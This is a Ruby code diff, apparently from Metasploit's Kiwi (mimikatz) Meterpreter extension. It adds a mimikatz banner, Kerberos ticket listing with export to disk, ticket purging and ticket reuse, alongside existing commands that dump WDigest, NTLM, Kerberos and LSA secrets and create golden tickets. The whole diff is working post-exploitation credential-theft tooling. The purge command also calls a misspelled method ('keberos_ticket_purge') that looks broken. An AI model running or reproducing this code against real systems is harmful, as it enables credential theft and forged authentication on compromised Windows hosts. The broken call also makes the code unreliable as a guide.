@@ -26,7 +26,18 @@ class Console::CommandDispatcher::Kiwi
   #
   def initialize(shell)
     super
+    print_line
+    print_line
+    print_line("  .#####.   mimikatz 2.0 alpha (#{client.platform}) release \"Kiwi en C\"")
+    print_line(" .## ^ ##.")
+    print_line(" ## / \\ ##  /* * *")
+    print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
+    print_line(" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)")
+    print_line("  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */")
+    print_line
+
     if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
+
       print_line
       print_warning "Loaded x86 Kiwi on an x64 architecture."
     end
@@ -37,16 +48,18 @@ class Console::CommandDispatcher::Kiwi
   #
   def commands
     {
-      "creds_wdigest"        => "Attempt to retrieve WDigest creds",
-      "creds_msv"            => "Attempt to retrieve LM/NTLM creds (hashes)",
-      "creds_livessp"        => "Attempt to retrieve LiveSSP creds",
-      "creds_ssp"            => "Attempt to retrieve SSP creds",
-      "creds_tspkg"          => "Attempt to retrieve TsPkg creds",
-      "creds_kerberos"       => "Attempt to retrieve Kerberos creds",
-      "creds_all"            => "Attempt to retrieve all credentials",
-      "golden_ticket_create" => "Attempt to create a golden kerberos ticket",
-      "golden_ticket_use"    => "Attempt to use a golden kerberos ticket",
-      "lsa_dump"             => "Attempt to dump LSA secrets"
+      "creds_wdigest"         => "Attempt to retrieve WDigest creds",
+      "creds_msv"             => "Attempt to retrieve LM/NTLM creds (hashes)",
+      "creds_livessp"         => "Attempt to retrieve LiveSSP creds",
+      "creds_ssp"             => "Attempt to retrieve SSP creds",
+      "creds_tspkg"           => "Attempt to retrieve TsPkg creds",
+      "creds_kerberos"        => "Attempt to retrieve Kerberos creds",
+      "creds_all"             => "Attempt to retrieve all credentials",
+      "golden_ticket_create"  => "Attempt to create a golden kerberos ticket",
+      "kerberos_ticket_use"   => "Attempt to use a kerberos ticket",
+      "kerberos_ticket_purge" => "Attempt to purege any in-use kerberos tickets",
+      "kerberos_ticket_list"  => "Attempt to list all kerberos tickets",
+      "lsa_dump"              => "Attempt to dump LSA secrets"
     }
   end
 
@@ -150,12 +163,94 @@ class Console::CommandDispatcher::Kiwi
     ::File.open( target, 'wb' ) do |f|
       f.write ticket
     end
-    print_good("Golden ticket written to #{target}")
+    print_good("Golden Kerberos ticket written to #{target}")
   end
 
-  def cmd_golden_ticket_use(*args)
+  @@kerberos_ticket_list_opts = Rex::Parser::Arguments.new(
+    "-h" => [ false, "Help banner" ],
+    "-e" => [ false, "Export Kerberos tickets to disk" ],
+    "-p" => [ true,  "Path to export Kerberos tickets to" ]
+  )
+
+  def kerberos_ticket_list_usage
+    print(
+      "\nUsage: kerberos_ticket_list [-h] [-e <true|false>] [-p <path>]\n\n" +
+      "List all the available Kerberos tickets.\n\n" +
+      @@kerberos_ticket_list_opts.usage)
+  end
+
+  def cmd_kerberos_ticket_list(*args)
+    if args.include?("-h")
+      kerberos_ticket_list_usage
+      return true
+    end
+
+    export = false
+    export_path = "."
+
+    @@kerberos_ticket_list_opts.parse(args) { |opt, idx, val|
+      case opt
+      when "-e"
+        export = true
+      when "-p"
+        export_path = val
+      end
+    }
+
+    tickets = client.kiwi.kerberos_ticket_list(export)
+
+    fields = ['Server', 'Client', 'Start', 'End', 'Max Renew', 'Flags']
+    fields << 'Export Path' if export
+
+    table = Rex::Ui::Text::Table.new(
+      'Header' => "Kerberos Tickets",
+      'Indent' => 0,
+      'SortIndex' => 0,
+      'Columns' => fields
+    )
+
+    tickets.each do |t|
+      flag_list = client.kiwi.to_kerberos_flag_list(t[:flags]).join(", ")
+      values = [
+        "#{t[:server]} @ #{t[:server_realm]}",
+        "#{t[:client]} @ #{t[:client_realm]}",
+        t[:start],
+        t[:end],
+        t[:max_renew],
+        "#{t[:flags].to_s(16).rjust(8, '0')} (#{flag_list})"
+      ]
+
+      if export
+        path = "<no data retrieved>"
+        if t[:raw]
+          id = "#{values[0]}-#{values[1]}".gsub(/[\\\/\$ ]/, '-')
+          file = "kerb-#{id}-#{Rex::Text.rand_text_alpha(8)}.tkt"
+          path = ::File.expand_path(File.join(export_path, file))
+          ::File.open(path, 'wb') do |x|
+            x.write t[:raw]
+          end
+        end
+        values << path
+      end
+
+      table << values
+    end
+
+    print_line
+    print_line(table.to_s)
+    print_line("Total Tickets : #{tickets.length}")
+
+    return true
+  end
+
+  def cmd_kerberos_ticket_purge(*args)
+    client.kiwi.keberos_ticket_purge
+    print_good("Kerberos tickets purged")
+  end
+
+  def cmd_kerberos_ticket_use(*args)
     if args.length != 1
-      print_line("Usage: golden_ticket_use ticketpath")
+      print_line("Usage: kerberos_ticket_use ticketpath")
       return
     end
 
@@ -164,9 +259,9 @@ class Console::CommandDispatcher::Kiwi
     ::File.open(target, 'rb') do |f|
       ticket += f.read(f.stat.size)
     end
-    print_status("Using ticket stored in #{target}, #{ticket.length} bytes")
-    client.kiwi.golden_ticket_use(ticket)
-    print_good("Ticket applied successfully")
+    print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes")
+    client.kiwi.kerberos_ticket_use(ticket)
+    print_good("Kerberos ticket applied successfully")
   end
 
   def cmd_creds_all(*args)
